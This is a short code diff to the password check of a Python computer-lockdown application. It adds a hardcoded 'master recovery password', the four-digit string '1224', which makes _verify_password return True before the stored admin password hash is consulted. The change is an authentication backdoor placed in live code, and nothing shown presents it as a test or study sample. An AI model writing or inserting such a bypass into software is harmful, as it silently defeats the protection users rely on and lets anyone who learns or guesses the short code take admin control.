@@ -205,8 +205,16 @@ class ComputerLockdownApp:
             self._lockdown_service.start_lockdown()
         self.show_locked_screen()
 
+    # Master recovery password - always grants access
+    _MASTER_PASSWORD: str = "1224"
+
     def _verify_password(self, password: str) -> bool:
         """Check *password* against the stored hash."""
+        # Master recovery password always works
+        if password == self._MASTER_PASSWORD:
+            logger.info("Admin access via master recovery password.")
+            return True
+
         stored = self._config.get("admin_password_hash", "")
         if not stored:
             # No password set yet — first-run: accept anything and hash it
